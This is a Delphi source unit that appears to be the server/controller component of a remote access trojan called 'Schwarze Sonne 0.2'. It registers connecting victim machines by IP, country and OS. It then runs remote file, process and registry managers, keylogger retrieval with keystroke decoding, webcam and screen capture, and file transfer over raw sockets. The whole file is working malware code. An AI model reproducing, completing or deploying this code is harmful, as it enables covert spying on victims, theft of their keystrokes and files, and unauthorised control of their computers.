unit uConn;

interface
uses Windows,zlib,uScreenNor,ShellAPI,graphics,Classes,sysUtils,Winsock,ComCtrls, uRegistryeditor,StdCtrls, ExtCtrls,jpeg, uScreen,uProcess,ucamspy,ukeylogger;
type
  TDUMMYUNIONNAME = record
    case integer of
      0: (uTimeout: UINT);
      1: (uVersion: UINT);
  end;
type
TNotifyIconData = record
    cbSize:  DWORD;
    Wnd:     HWND;
    uID:     UINT;
    uFlags:  UINT;
    uCallbackMessage: UINT;
    hIcon:   HICON;
    szTip:   array [0..127] of char;
    dwState: DWORD;
    dwStateMask: DWORD;
    szInfo:  array [0..255] of char;
    DUMMYUNIONNAME: TDUMMYUNIONNAME;
    szInfoTitle: array [0..63] of char;
    dwInfoFlags: DWORD;
  end;
type
  TConnThread = class(TThread)
  private
    ConnSock:Integer;
    TransSocket:Integer;
    TempSocket:Integer;
    TransSize:Integer;
    TransName:string;
    tsListitem:TListItem;
    TransferedSize:Integer;
    TransSpeed:Integer;
    TransTimeLeft:string;
    tTempScreen:Tform4;
    tTempScreenN:Tform12;
    pString:string;
    tTempCam:TForm7;
    tTempKeylog:TForm10;
    KlogText:string;
    KlogListitem:TListItem;
  protected
    procedure Execute; override;
  public
    constructor Create(CreateSuspended: Boolean);
    procedure SetSocket(sValue: Integer);
    Function ListenHost:DWord;
    Function Explode(sDelimiter: String; sSource: String): TStringList;
    procedure HandleTerminate(Sender: TObject);
    procedure TransFile();
    procedure AddtoList();
    procedure DelFromList();
    procedure UpdateList();
    procedure GetTimeLeft();
    procedure TransScreen();
    procedure GetForm12();
    procedure SetStatus();
    procedure SetStatusWebcam();
    procedure GetForm5();
    procedure TransCam();
    procedure Notify(tItem: TListItem);
    procedure AddKeylog;
    procedure GetKey();
    procedure SendFile();
    procedure AddtoList2();
    procedure TransKeylog();
    procedure GetForm10();
    procedure SetStatus2();
    procedure KeylogString();
  end;

implementation
uses uSettings, mainU, uFlag, uFilemanager,uTransferView;
Function GetPath: String;
Begin
  Result := ExtractFilePath(ParamStr(0)) + 'Downloads\';
  If (Not DirectoryExists(Result)) Then
    CreateDirectory(pChar(Result), NIL);
End;
procedure TConnThread.AddKeylog;
begin
  TForm10(KlogListitem.SubItems.Objects[4]).redt1.text := TForm10(KlogListitem .SubItems.Objects[4]).redt1.text + KlogText;

end;
procedure TConnThread.SetSocket(sValue: Integer);
begin
  ConnSock := sValue;
end;

Function RemoteAddr(Sock: TSocket): TSockAddrIn;
Var
  W     :TWSAData;
  S     :TSockAddrIn;
  I     :Integer;
Begin
  WSAStartUP($0202, W);
  I := SizeOf(S);
  GetPeerName(Sock, S, I);
  WSACleanUP();
  Result := S;
End;
function CompareString(s1,s2: string; Len: dword): string;
var
  i: integer;
begin
  if Length(s1) <> length(s2) then exit;
  setlength(Result,Len);
  for i := 1 to Len do begin
    if s2[i] = '%' then begin
      Result[i] := s1[i];
    end else begin
      Result[i] := s2[i];
    end;
  end;
end;
procedure TConnThread.GetKey();
var
  t:integer;
  ucase:Boolean;
begin
  if Copy(klogtext,1,1) = '!' then begin
    ucase := True;
  end else begin
    ucase := false;
  end;
  t := StrToInt(Copy(klogtext,2,Length(KlogText) - 1));
  case t of
   8 : KlogText := '[Backspace]';
   9 : KlogText := '[TAB]';
   $10: KlogText := '[Shift]';
   13: KlogText := '[Enter]';
   17: KlogText := '[Ctrl]';
   27: KlogText := '[Esc]';
   32: KlogText := '[Space]';
   33: KlogText := '[Page Up]';
   34: KlogText := '[Page Down]';
   35: KlogText := '[End]';
   36: KlogText := '[Home]';
   37: KlogText := '[Left]';
   38: KlogText := '[Up]';
   39: KlogText := '[Right]';
   40: KlogText := '[Down]';
   44: KlogText := '[Print Screen]';
   45: KlogText := '[Insert]';
   46: KlogText := '[Del]';
   48: if ucase then KlogText := '[Shift+0]'
             else KlogText := '0';
   49: if ucase then KlogText := '[Shift+1]'
             else KlogText := '1';
   50: if ucase then KlogText := '[Shift+2]'
             else KlogText := '2';
   51: if ucase then KlogText := '[Shift+3]'
             else KlogText := '3';
   52: if ucase then KlogText := '[Shift+4]'
             else KlogText := '4';
   53: if ucase then KlogText := '[Shift+5]'
             else KlogText := '5';
   54: if ucase then KlogText := '[Shift+6]'
             else KlogText := '6';
   55: if ucase then KlogText := '[Shift+7]'
             else KlogText := '7';
   56: if ucase then KlogText := '[Shift+8]'
             else KlogText := '8';
   57: if ucase then KlogText := '[Shift+9]'
             else KlogText := '9';
   65..90:if ucase = false then KlogText := LowerCase(Chr(t))
            else KlogText := UpperCase(Chr(t));
   91: KlogText := '[Win]';
   96..105: KlogText := inttostr(t-96);
   106: KlogText := '*';
   107: KlogText := '&';
   109: KlogText := '-';
   110: KlogText := '.';
   111: KlogText := '/';
   112..123: KlogText := '[F'+IntToStr(t - 111)+']';
   144: KlogText := '[Numlock]';
   160: KlogText := '';
   161: KlogText := '';
   162: KlogText := '[Ctrl]';
   163: KlogText := '';
   164: KlogText := '[Alt]';
   186: if ucase then KlogText := 'Ü'
        else KlogText := 'ü';
   187: if ucase then KlogText := '*'
        else KlogText := '+';
   188: if ucase then KlogText := ';'
        else KlogText := ',';
   189: if ucase then KlogText := '_'
        else KlogText := '-';
   190: if ucase then KlogText := ':'
        else KlogText := '.';
   191: if ucase then KlogText := ''''
        else KlogText := '#';
   192: if ucase then KlogText := 'Ö'
        else KlogText := 'ö';
   219: if ucase then KlogText := '?'
        else KlogText := 'ß';
   220: if ucase then KlogText := '°'
        else KlogText := '^';
   221: if ucase then KlogText := '`'
        else KlogText := '´';
   222: if ucase then KlogText := 'Ä'
        else KlogText := 'ä';
   else KlogText := ''
  end;
End;
procedure TConnThread.GetTimeLeft();
Var
  dDay  :Integer;
  dHour :Integer;
  dMin  :Integer;
  dSec  :Integer;
  dTmp  :Integer;
  dTmp2 :Integer;
Begin
  If TransSpeed = 0 Then Exit;
  If Transferedsize = 0 Then Exit;

  dDay := 0; dHour := 0; dMin := 0;
  dTmp2 := 0; dTmp := 0;

  While dTmp2 <= (transsize - Transferedsize) Do
  Begin
    Inc(dTmp2, TransSpeed);
    Inc(dTmp, 1);
  End;

  dSec := dTmp;

  If dSec > 60 Then
    repeat
      dec(dSec, 60);
      inc(dMin, 1);
    until dSec < 60;

  If dMin > 60 Then
    repeat
      dec(dMin, 60);
      inc(dHour, 1);
    until dMin < 60;

  If dHour > 24 Then
    repeat
      dec(dHour, 24);
      inc(dDay, 1);
    until dHour < 24;

  TransTimeLeft := IntToStr(dDay)  + 'd '+
            IntToStr(dHour) + 'h '+
            IntToStr(dMin)  + 'm '+
            IntToStr(dSec)  + 's';
End;
Function RemoteAddress(Sock: TSocket): String;
Begin
  Result := INET_NTOA(RemoteAddr(Sock).sin_addr);
End;
procedure TConnThread.DelFromList();
begin
tsListitem.Delete;
end;
procedure TConnThread.Notify(tItem: TListItem);
var
  Mensaje, Titulo: string;
  Item: TListItem;
begin
  item    := tItem;
  TrayIconData.cbSize := SizeOf(TrayIconData);
  TrayIconData.uFlags := $10;
  Mensaje := 'IP: ' + Item.caption + #13 + 'Country: ' + Item.SubItems.Strings[2] + #13 + 'OS: ' + Item.SubItems.Strings[3] ;
  strPLCopy(TrayIconData.szInfo, Mensaje, SizeOf(TrayIconData.szInfo) - 1);
  TrayIconData.DUMMYUNIONNAME.uTimeout := 300;
  Titulo := Item.SubItems[1] + ' Connected!';
  strPLCopy(TrayIconData.szInfoTitle, Titulo, SizeOf(TrayIconData.szInfoTitle) - 1);
  TrayIconData.dwInfoFlags := $00000001;
  Shell_NotifyIcon(NIM_MODIFY, @TrayIconData);
  TrayIconData.DUMMYUNIONNAME.uVersion := 3;
  if not Shell_NotifyIcon($00000004, @TrayIconData) then
end;
Function RemotePort(Sock: TSocket): String;
Begin
  Result := IntToStr(nTohs(RemoteAddr(Sock).sin_port));
End;

procedure TConnThread.UpdateList();
var
  smd:extended;
begin
smd := TransferedSize / TransSize;
if trunc(smd * 100) <= 100 then begin
tsListitem.SubItems.Strings[1] := IntToStr(trunc(smd * 100)) + ' %';
end else begin
tsListitem.SubItems.Strings[2] := TransTimeLeft;
end;
end;

procedure TConnThread.AddtoList();
begin
tsListitem := Form3.lv1.Items.Add;
tsListitem.Caption := Transname;
tsListitem.SubItems.Add(IntToStr(TransSize));
tsListitem.SubItems.Add('0 %');
tsListitem.SubItems.Add('-');
tsListitem.SubItems.Add('Downloading');
tsListitem.ImageIndex := 0;
end;

procedure TConnThread.AddtoList2();
begin
tsListitem := Form3.lv1.Items.Add;
tsListitem.Caption := Transname;
tsListitem.SubItems.Add(IntToStr(TransSize));
tsListitem.SubItems.Add('0 %');
tsListitem.SubItems.Add('-');
tsListitem.SubItems.Add('Uploading');
tsListitem.ImageIndex := 1;
end;

Function SendData(Sock: TSocket; Text: String): Integer;
Begin
  Result := Send(Sock, Text[1], Length(Text), 0);
End;

procedure TConnThread.HandleTerminate(Sender: TObject);
var i:Integer;
begin
  for i := 0 to MainForm.lv1.Items.Count -1 do begin
    if mainform.lv1.Items.Item[i].SubItems.Strings[0] = IntToStr(ConnSock) then begin
      mainform.lv1.Items.Item[i].Delete;
      Exit;
    end;
  end;
  MainForm.Caption := 'Schwarze Sonne 0.2 - Connected Users: ' + IntToStr(MainForm.lv1.Items.Count);
end;

constructor TConnThread.Create(CreateSuspended: Boolean);
begin
  inherited;
  ConnSock := 0;
end;

procedure TConnThread.Execute;
begin
  FreeOnTerminate:=True;
  OnTerminate := HandleTerminate;
  ListenHost;
end;

Function TConnThread.Explode(sDelimiter: String; sSource: String): TStringList;
Var
  c: Word;
Begin
  Result := TStringList.Create;
  C := 0;

  While sSource <> '' Do
  Begin
    If Pos(sDelimiter, sSource) > 0 Then
    Begin
      Result.Add(Copy(sSource, 1, Pos(sDelimiter, sSource) - 1 ));
      Delete(sSource, 1, Length(Result[c]) + Length(sDelimiter));
    End
    Else
    Begin
      Result.Add(sSource);
      sSource := ''
    End;

    Inc(c);
  End;
End;

procedure TConnThread.GetForm5();
var
  f:Integer;
begin
for f := 0 to MainForm.lv1.Items.Count -1 do begin
    if MainForm.lv1.Items.Item[f].SubItems.Strings[0]= IntToStr(TempSocket) then begin
       tTempCam := TForm7(mainform.lv1.items.item[f].subitems.Objects[3]);
       Exit;
    end;
end;
end;

procedure TConnThread.GetForm10();
var
  f:Integer;
begin
  OutputDebugString(pchar(IntToStr(TempSocket)));
for f := 0 to MainForm.lv1.Items.Count -1 do begin
    if MainForm.lv1.Items.Item[f].SubItems.Strings[0]= IntToStr(TempSocket) then begin
       tTempKeylog := TForm10(mainform.lv1.items.item[f].subitems.Objects[4]);
       Exit;
    end;
end;
end;

procedure TConnThread.GetForm12();
var
  f:Integer;
begin
for f := 0 to MainForm.lv1.Items.Count -1 do begin
    if MainForm.lv1.Items.Item[f].SubItems.Strings[0]= IntToStr(TempSocket) then begin
       tTempScreenN := TForm12(mainform.lv1.items.item[f].subitems.Objects[6]);
       Exit;
    end;
end;
end;
procedure TConnThread.KeylogString();
begin
tTempKeylog.redt2.text := pString;
end;

procedure TConnThread.SetStatus();
begin
  tTempScreenN.pb1.Max := TransSize;
  tTempScreenN.pb1.Position := TransferedSize;
end;

procedure TConnThread.SetStatus2();
begin
tTempkeylog.pb1.max := TransSize;
  tTempkeylog.pb1.Position := TransferedSize;
end;

procedure TConnThread.SetStatusWebcam();
begin
tTempCam.pb1.max := TransSize;
tTempCam.pb1.Position := TransferedSize;
end;
procedure DecompressStream(inpStream, outStream: TStream);
var
  InpBuf, OutBuf: Pointer;
  OutBytes, sz: Integer;
begin
  InpBuf := nil;
  OutBuf := nil;
  sz     := inpStream.Size - inpStream.Position;
  if sz > 0 then 
    try
      GetMem(InpBuf, sz);
      inpStream.Read(InpBuf^, sz);
      DecompressBuf(InpBuf, sz, 0, OutBuf, OutBytes);
      outStream.Write(OutBuf^, OutBytes);
    finally
      if InpBuf <> nil then FreeMem(InpBuf);
      if OutBuf <> nil then FreeMem(OutBuf);
    end;
  outStream.Position := 0;
end;
procedure TConnThread.TransCam();
var
  h,j:tmemorystream;
  BytesSize:Cardinal;
  T:String;
  Total:Integer;
  rFile:Array[0..8000] Of Char;
  dErr:Integer;
  jpg: TBitmap;
Label
  Disconnected,
  Finished,TotalEnd;
begin
  Synchronize(getform5);
  h := TMemoryStream.Create;
  TransferedSize := 0;
  Synchronize(SetStatusWebcam);
  BytesSize := 0;
  T := 'ok';
  If (BytesSize < TransSize) Then
  Begin
    Total := 1;
    Repeat
      FillChar(rFile, SizeOf(rFile), 0);
      dErr := Recv(Transsocket, rFile, SizeOf(rFile), 0);
      If dErr = -1 Then Break;
      if TransSize < (derr + total) then begin
        h.Write(rFile,TransSize - total + 1);
        ttempcam.pb1.Position := TransSize;
        Inc(Total, derr);
      end else begin
        Inc(Total, dErr);
        h.Write(rFile,dErr);
        ttempcam.pb1.Position := total;
      end;
      TransferedSize := Total;
      Send(Transsocket, t[1], length(t), 0);
    Until (Total >= TransSize);
    Goto Finished;
  End Else
    Goto Finished;

Disconnected:
  Sleep(1000);
  Goto Finished;

Finished:
  h.Seek(0,sofromBeginning);
  if h.Size = 0 then begin
    ttempcam.PngBitBtn1.Caption := 'Start';
    MessageBox(ttempcam.handle,PChar('No Webcam installed!'),PChar('Error!'),0);
    goto Totalend;
  end;
  j := TMemoryStream.Create;
  DecompressStream(h,j);
  jpg := TBitmap.Create;
  jpg.LoadFromStream(j);
  ttempcam.img1.Picture.Assign(jpg);
  if ttempcam.sStop = false then
  ttempcam.btn1.Enabled := false;
Totalend:
  h.Free;
  j.free;
  jpg.Free;

end;
Function  StreamToString(AStream: TStream): String;
Begin
  SetLength(Result, AStream.Size);
  AStream.Position := 0;
  AStream.ReadBuffer(Result[1], AStream.Size);
End;
procedure TConnThread.TransScreen();
var
  h,lo:tmemorystream;
  BytesSize:Cardinal;
  T:String;
  Total:Integer;
  rFile:Array[0..8000] Of Char;
  dErr:Integer;
  data:string;
Label
  Disconnected,
  Finished;
begin
  Synchronize(getform12);
  h := TMemoryStream.Create;
  TransferedSize := 0;
  Synchronize(setstatus);
  BytesSize := 0;
  T := 'ok';
  If (BytesSize < TransSize) Then
  Begin
    Total := 1;
    Repeat
      FillChar(rFile, SizeOf(rFile), 0);
      Synchronize(setstatus);
      dErr := Recv(Transsocket, rFile, SizeOf(rFile), 0);
      If dErr = -1 Then Break;
      if TransSize < (derr + total) then begin
        h.Write(rFile,TransSize - total + 1);
        //tTempScreenN.pb1.Position := tTempScreenN.pb1.Max;
        Inc(Total, derr);
      end else begin
        Inc(Total, dErr);
        h.Write(rFile,dErr);
      end;
      TransferedSize := Total;
      OutputDebugString(pchar(IntToStr(transsize-transferedsize)));
      Send(Transsocket, t[1], length(t), 0);
    Until (Total >= TransSize);
    Goto Finished;
  End Else
    Goto Finished;

Disconnected:
  Sleep(1000);
  Goto Finished;

Finished:
h.Seek(0,sofromBeginning);
lo := TMemoryStream.Create;
DecompressStream(h,lo);
  tTempScreenN.Img1.Picture.Bitmap.LoadFromStream(lo);
h.Free;
lo.Free;
tTempScreenN.pb1.Position := 0;
if tTempScreenN.sStop = false then begin
  Data := '50|' + tTempScreenN.Stat1.Panels[0].Text +  '|' + IntToStr(tTempScreenN.TrackBar2.Position) +'|' + #10;
  send(TempSocket,data[1],Length(data),0);
end;
  {h.Seek(0,sofromBeginning);
  jpg := TJpegimage.Create;
  jpg.LoadFromStream(h);
  tTempScreen.img1.Picture.Assign(jpg);
  h.Free;
  jpg.Free;
  if tTempScreen.sStop = false then
  tTempScreen.btn1.Enabled := false;}
  //except
  //  MessageBox(0,PChar('No Cam installed'),PChar('Error'),0);

  //  jpg.Free;

end;
procedure TConnThread.SendFile();
Var
  BytesRead     :Cardinal;
  F             :File;
  Buf           :Array[0..8000] Of Char;
  Total:Integer;
  dErr:Integer;
  Start         :Cardinal;
Begin
  Synchronize(AddtoList2);
  {$I-}
  AssignFile(F, transname);
  Reset(F, 1);
  Start := GetTickCount;
  Total := 1;
  Repeat
    BlockRead(F, Buf, SizeOf(Buf), BytesRead);
    If (BytesRead = 0) Then Break;
    dErr := Send(TransSocket, Buf[0], SizeOf(Buf), 0);
    If dErr = -1 Then Break;
    Inc(Total, derr);
    FillChar(Buf, SizeOf(Buf), 0);
    dErr := Recv(TransSocket, Buf, SizeOf(Buf), 0);
    If dErr = -1 Then Break;
    TransferedSize := Total;
    TransSpeed := Total DIV (((GetTickCount() - Start) DIV 1000) + 1);
    Synchronize(GetTimeLeft);
    Synchronize(updatelist);
  Until BytesRead = 0;
  CloseFile(F);
  {$I+}
Sleep(1000);
Synchronize(delfromlist);
End;

procedure TConnThread.TransKeylog();
var
  BytesSize:Cardinal;
  T:String;
  Total:Integer;
  Start:Integer;
  dBuff: pchar;
  rFile:Array[0..8000] Of Char;
  dErr:Integer;
Label
  Disconnected,
  Finished;
begin
  Synchronize(GetForm10);
  BytesSize := 0;
  T := 'ok';
  If (BytesSize < TransSize) Then
  Begin
    Start := GetTickCount;
    Total := 1;
    Synchronize(SetStatus2);
    Repeat
      FillChar(rFile, SizeOf(rFile), 0);
      dErr := Recv(Transsocket, rFile, SizeOf(rFile), 0);
      If dErr = -1 Then Break;
      if TransSize < (derr + total) then begin
        GetMem(dBuff, dErr);
        CopyMemory(dBuff, @rFile, dErr);
        pString := pString + dBuff;
        Inc(Total, derr);
        tTempKeylog.pb1.Position := TransSize;
      end else begin
        Inc(Total, dErr);
        GetMem(dBuff, dErr);
        CopyMemory(dBuff, @rFile, dErr);
        pString := pString + dBuff;
        tTempKeylog.pb1.Position := Total;
      end;
      TransferedSize := Total;
      TransSpeed := Total DIV (((GetTickCount() - Start) DIV 1000) + 1);
      Send(Transsocket, t[1], length(t), 0);
    Until (Total >= TransSize);
    Goto Finished;
  End Else
    Goto Finished;

Disconnected:
  Sleep(1000);
  Goto Finished;

Finished:
  Synchronize(KeylogString);
  Sleep(1000);
end;

procedure TConnThread.TransFile();
var
  F:THandle;
  BytesSize:Cardinal;
  T:String;
  Total:Integer;
  Start:Integer;
  rFile:Array[0..8000] Of Char;
  dErr:Integer;
  BytesWritten:Cardinal;
Label
  Disconnected,
  Finished;
begin
  Synchronize(AddtoList);
  F := CreateFile(pChar(GetPath+TransName), GENERIC_WRITE, FILE_SHARE_WRITE, NIL, CREATE_NEW, 0, 0);
  BytesSize := 0;
  SetFilePointer(F, 0, NIL, FILE_END);
  T := 'ok';
  If (BytesSize < TransSize) Then
  Begin
    Start := GetTickCount;
    Total := 1;
    Repeat
      FillChar(rFile, SizeOf(rFile), 0);
      dErr := Recv(Transsocket, rFile, SizeOf(rFile), 0);
      If dErr = -1 Then Break;
      if TransSize < (derr + total) then begin
        SetFilePointer(F, 0, NIL, FILE_END);
        WriteFile(F, rFile, TransSize - total + 1, BytesWritten, NIL);
        Inc(Total, derr);
      end else begin
        Inc(Total, dErr);
        SetFilePointer(F, 0, NIL, FILE_END);
        WriteFile(F, rFile, dErr, BytesWritten, NIL);
      end;
      TransferedSize := Total;
      TransSpeed := Total DIV (((GetTickCount() - Start) DIV 1000) + 1);
      Synchronize(GetTimeLeft);
      Synchronize(updatelist);
      Send(Transsocket, t[1], length(t), 0);
    Until (Total >= TransSize);
    Goto Finished;
  End Else
    Goto Finished;

Disconnected:
  Sleep(1000);
  Goto Finished;

Finished:
  CloseHandle(F);
  Synchronize(delfromlist);
  Sleep(1000);
  //closesocket(TransSocket);
end;

Function TConnThread.ListenHost:DWord;
label Disconnect;
Var
  Address, Port :String;
  Sock: TSocket;
  Buffer: Array[0..1600] Of Char;
  Data: String;
  Len: Integer;
  Temp: String;
  Cmd: String;
  pStrList :tstringlist;
  cStrList:TStringList;
  I: Word;
  sItem: TListItem;
  saItem:TListItem;
  sFileman :TForm2;
  sProcman:TForm5;
  sKeylogF:TForm10;
  sRegEditr:Tform11;
  Nodo: TTreeNode;
  sDat:string;
Begin
  Sock := ConnSock;
  Address := RemoteAddress(Sock);
  Port := RemotePort(Sock);
  sDat := '';
  Repeat
    Len := Recv(Sock, Buffer, 1600, 0);
    If (Len <= 0) Then Break;
    Data := String(Buffer);
    ZeroMemory(@Buffer, SizeOf(Buffer));
    sDat := sDat + Data;
    if Copy(sDat,Length(sdat),1) = #10 then begin
      Temp := Copy(sDat, 1, Pos(#10, sDat)-1);
      pStrList := Explode('|',Temp);
      cmd := pStrList.Strings[0];
        if cmd = '01' then begin
          if pStrList.Strings[1] <> form1.edt2.Text then begin
            Break;
          end;
        end;

        if Cmd = '02' then begin
          sItem := mainform.lv1.Items.Add;
          sItem.Caption := Address;
          sItem.SubItems.Add(inttostr(sock));
          sItem.SubItems.Add(pStrList.Strings[1]);
          sItem.SubItems.Add(GetCountry(pStrList.Strings[3]));
          sItem.SubItems.Add(pStrList.Strings[2]);
          sItem.SubItems.Add('');
          sItem.SubItems.Add('');
          sItem.SubItems.Add('');
          sItem.ImageIndex := GetFlag(pStrList.Strings[3]);
          MainForm.Caption := 'Schwarze Sonne 0.2 - Connected Users: ' + IntToStr(MainForm.lv1.Items.Count);
          Notify(sItem);
        end;

        if cmd = '12' then begin
            if sItem.SubItems.Objects[0] <> nil then begin
              TForm2(sItem.SubItems.Objects[0]).Show;
            end else begin
              sFileman := tform2.Create(nil);
              sFileman.Show;
              sFileman.Caption := 'Filemanager - ' +  sItem.SubItems.Strings[1];
              sFileman.stat1.Panels.Items[0].Text := sItem.SubItems.Strings[0];
              sFileman.stat1.Panels.Items[1].Text := sItem.Caption;
              sFileman.cbb1.Clear;
              sItem.SubItems.Objects[0] := sFileman;
            end;
            for i := 1 to pStrList.Count - 1 do begin
              TForm2(sItem.SubItems.Objects[0]).cbb1.AddItem(pStrList.Strings[i],nil);
            end;
        end;

        if cmd = '16' then begin
           if sItem.SubItems.Objects[2] <> nil then begin
           TForm5(sItem.SubItems.Objects[2]).Show;
          end else begin
            sProcman := tform5.Create(nil);
            sProcman.Show;
            sProcman.Caption := 'Processmanager - ' +  sItem.SubItems.Strings[1];
            sProcman.stat1.Panels.Items[0].Text := sItem.SubItems.Strings[0];
            sProcman.stat1.Panels.Items[1].Text := sItem.Caption;
            sProcman.lv1.Clear;
            sItem.SubItems.Objects[2] := sFileman;
          end;
          TForm5(sItem.SubItems.Objects[2]).lv1.Enabled := false;
          TForm5(sItem.SubItems.Objects[2]).lv1.Items.BeginUpdate;
          for i := 1 to pStrList.Count - 1 do begin
            cStrList := Explode('#',pStrList.Strings[i]);

              saItem := TForm5(sItem.SubItems.Objects[2]).lv1.Items.Add;
              saItem.Caption := cStrList.Strings[2];
              saItem.SubItems.Add(cStrList.Strings[1]);
              saItem.SubItems.Add(cStrList.Strings[0]);
          end;
          TForm5(sItem.SubItems.Objects[2]).lv1.Items.endUpdate;
          TForm5(sItem.SubItems.Objects[2]).lv1.Enabled := true;
        end;

        if Cmd = '18' then begin
          if sItem.SubItems.Objects[0] <> nil then begin
           TForm2(sItem.SubItems.Objects[0]).Show;
          end else begin
            sFileman := tform2.Create(nil);
            sFileman.Show;
            sFileman.Caption := 'Filemanager - ' +  sItem.SubItems.Strings[1];
            sFileman.stat1.Panels.Items[0].Text := sItem.SubItems.Strings[0];
            sFileman.stat1.Panels.Items[1].Text := sItem.Caption;
            sFileman.cbb1.Clear;
            sItem.SubItems.Objects[0] := sFileman;
          end;
          TForm2(sItem.SubItems.Objects[0]).lv1.Enabled := false;
          TForm2(sItem.SubItems.Objects[0]).lv1.Items.BeginUpdate;
          for i := 1 to pStrList.Count - 1 do begin
            cStrList := Explode('#',pStrList.Strings[i]);
            If (cStrList.Strings[2] <> '.') Then
            Begin
              saItem := TForm2(sItem.SubItems.Objects[0]).lv1.Items.Add;
              saItem.Caption := cStrList.Strings[2];
             If (cStrList.Strings[2] = '..') Then begin
                  saItem.SubItems.Add('Go Back');
                  saItem.ImageIndex := 2;
                  saItem.SubItems.Add(' ');
             end else begin
               If (cStrList.Strings[0] = 'DIR') Then begin
                 saItem.ImageIndex := 0;
               end else begin
                 saItem.ImageIndex := 1;
               end;
               saItem.SubItems.Add(cStrList.Strings[0]);
               saItem.SubItems.Add(cStrList.Strings[1] + ' Bytes');
             end;
            end;
          end;
          TForm2(sItem.SubItems.Objects[0]).lv1.Items.endUpdate;
          TForm2(sItem.SubItems.Objects[0]).lv1.Enabled := true;
        end;

        if cmd = '24' then begin
          Tempsocket :=  strtoint(pStrList.Strings[1]);
          TransSocket:= Sock;
          for i := 0 to MainForm.lv1.Items.Count -1 do begin
            if MainForm.lv1.Items.Item[i].SubItems.Strings[0]= IntToStr(TempSocket) then begin
              tTempScreen := TForm4(mainform.lv1.items.item[i].subitems.Objects[1]);
            end;
          end;
          tTempScreen.stat1.Panels.Items[2].Text := IntToStr(Sock);
          tTempScreen.ProcessData;
          //TransScreen;
          Break;
        end;
        
        if cmd = '26' then begin
          TransSize := StrToInt(pStrList.Strings[1]);
          TransName :=  ExtractFileName(pStrList.Strings[2]);
          TransSocket := Sock;
          TransFile;
          Break;
        end;

        if cmd = '29' then begin
          TransSize := StrToInt(pStrList.Strings[2]);
          Tempsocket :=  strtoint(pStrList.Strings[3]);
          TransSocket:= Sock;
          TransCam;
          Break;
        end;
        if cmd = '32' then begin
          if sItem.SubItems.Objects[4] <> nil then begin
           //TForm10(sItem.SubItems.Objects[4]).Show;
          end else begin
            sKeylogF := tform10.Create(nil);
            sKeylogF.Show;
            sKeylogF.Caption := 'Keylogger - ' +  sItem.SubItems.Strings[1];
            sKeylogF.stat1.Panels.Items[0].Text := sItem.SubItems.Strings[0];
            sKeylogF.stat1.Panels.Items[1].Text := sItem.Caption;
            sItem.SubItems.Objects[4] := sKeylogF;
          end;
          KlogText := pStrList.Strings[1];
          KlogListitem := sItem;
          Synchronize(AddKeylog);
        end;
        if cmd = '33' then begin
          if sItem.SubItems.Objects[4] <> nil then begin
           TForm10(sItem.SubItems.Objects[4]).Show;
          end else begin
            sKeylogF := tform10.Create(nil);
            sKeylogF.Show;
            sKeylogF.Caption := 'Keylogger - ' +  sItem.SubItems.Strings[1];
            sKeylogF.stat1.Panels.Items[0].Text := sItem.SubItems.Strings[0];
            sKeylogF.stat1.Panels.Items[1].Text := sItem.Caption;
            sItem.SubItems.Objects[4] := sKeylogF;
          end;
          KlogText := #13 + #13 + pStrList.Strings[1] + #13;
          KlogListitem := sItem;
           Synchronize(AddKeylog);
        end;
        if cmd = '35' then begin
          if sItem.SubItems.Objects[5] <> nil then begin
           TForm11(sItem.SubItems.Objects[5]).Show;
          end else begin
            sRegEditr := tform11.Create(nil);
            sRegEditr.Show;
            sRegEditr.Caption := 'Registryeditor - ' +  sItem.SubItems.Strings[1];
            sRegEditr.stat1.Panels.Items[0].Text := sItem.SubItems.Strings[0];
            sRegEditr.stat1.Panels.Items[1].Text := sItem.Caption;
            sItem.SubItems.Objects[5] := sRegEditr;
          end;
          TForm11(sItem.SubItems.Objects[5]).tv1.Selected.DeleteChildren;
          for i := 1 to pStrList.Count - 1 do begin
            Nodo := TForm11(sItem.SubItems.Objects[5]).tv1.Items.AddChild(TForm11(sItem.SubItems.Objects[5]).tv1.Selected, pStrList.Strings[i]);
            Nodo.ImageIndex := 1;
            Nodo.SelectedIndex := 0;
          end;
          TForm11(sItem.SubItems.Objects[5]).tv1.Selected.Expand(False);
        end;
        if cmd = '36' then begin
          if sItem.SubItems.Objects[5] <> nil then begin
           TForm11(sItem.SubItems.Objects[5]).Show;
          end else begin
            sRegEditr := tform11.Create(nil);
            sRegEditr.Show;
            sRegEditr.Caption := 'Registryeditor - ' +  sItem.SubItems.Strings[1];
            sRegEditr.stat1.Panels.Items[0].Text := sItem.SubItems.Strings[0];
            sRegEditr.stat1.Panels.Items[1].Text := sItem.Caption;
            sItem.SubItems.Objects[5] := sRegEditr;
          end;
          for i := 1 to pStrList.Count - 1 do begin
            cStrList := Explode('#',pStrList.Strings[i]);
            saItem := TForm11(sItem.SubItems.Objects[5]).lvwRegedit.Items.Add;
            saItem.Caption := cStrList.Strings[0];
            saitem.SubItems.Add(cStrList.Strings[1]);
            saitem.SubItems.Add(cStrList.Strings[2]);
            if (cStrList.Strings[1] = 'REG_BINARY') or (cStrList.Strings[1] = 'REG_DWORD') then
            Begin
              saItem.ImageIndex := 2;
            end
            else
            Begin
              saItem.ImageIndex := 3;
            End;
          end;
        end;

        if cmd = '40' then begin
          TransSize := StrToInt(pStrList.Strings[2]);
          TransName :=  pStrList.Strings[1];
          TransSocket := Sock;
          SendFile;
          Break;
        end;

        if Cmd = '41' then begin
           TransSize := StrToInt(pStrList.Strings[1]);
           TransSocket := Sock;
           TempSocket := strtoint(pStrList.Strings[2]);
           TransKeylog;
           Break;
        end;
        if cmd = '50' then begin
          Tempsocket :=  strtoint(pStrList.Strings[3]);
          TransSize :=  strtoint(pStrList.Strings[2]);
          transsocket := socK;
          TransScreen;
          Break;
        end;
        OutputDebugString(PChar(sDat));
      sDat := '';
    end;

  Until 1 = 2;
  sItem.Delete;
  MainForm.Caption := 'Schwarze Sonne 0.2 - Connected Users: ' + IntToStr(MainForm.lv1.Items.Count);
  Disconnect:
  ZeroMemory(@I, SizeOf(I));
  CloseSocket(Sock);
End;
end.

